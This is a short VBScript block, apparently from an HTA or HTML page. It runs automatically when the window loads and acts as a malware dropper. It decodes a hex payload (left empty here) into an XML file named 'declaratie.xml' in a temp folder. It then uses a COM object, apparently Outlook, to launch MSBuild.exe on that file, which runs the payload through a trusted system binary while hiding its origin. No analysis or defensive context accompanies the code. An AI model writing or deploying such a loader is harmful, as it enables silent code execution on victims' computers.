<script language="VBScript">


	Function var_func()
		var_shellcode = ""

		Dim var_obj
		Set var_obj = CreateObject("Scripting.FileSystemObject")
		Dim var_stream
		Dim var_tempdir
		Dim var_tempxml
		Dim var_basedir
		Set var_tempdir = var_obj.GetSpecialFolder(2)
		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
		var_obj.CreateFolder(var_basedir)
		var_tempxml = var_basedir & "\" & "declaratie.xml"
		
		Set var_stream = var_obj.CreateTextFile(var_tempxml, true , false)
		For i = 1 to Len(var_shellcode) Step 2
		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
		Next
		var_stream.Close
        
        Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
        obj.CreateObject("WScript.Shell").Run("C:\Windows\Microsoft.NET\Framework"&Chr(92)&"v4.0.30319\Msbuild.exe "&var_tempxml)
		window.close()
	End Function

	
Sub window_onload
var_func
end sub

self.close
</script>
